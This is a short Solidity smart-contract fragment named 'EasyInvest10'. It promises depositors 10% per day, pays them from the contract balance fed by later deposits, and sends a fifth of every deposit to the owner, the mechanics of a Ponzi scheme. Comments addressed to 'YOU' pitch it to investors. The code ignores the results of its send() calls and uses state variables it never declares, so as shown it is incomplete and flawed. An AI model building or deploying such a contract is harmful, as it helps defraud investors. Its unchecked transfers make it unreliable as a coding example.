contract EasyInvest10 {
function() external payable {
        owner.send(msg.value/5);
         // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0){
         // calculate profit amount as such:   
        address kashout = msg.sender;
        // amount = (amount invested) * 10% * (blocks since last transaction) / 5900
        // 5900 is an average block count per day produced by Ethereum blockchain
        uint256 getout = invested[msg.sender]*10/100*(block.number-atBlock[msg.sender])/5900;
        // send calculated amount of ether directly to sender (aka YOU)
        kashout.send(getout);
        }
        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;

    }
}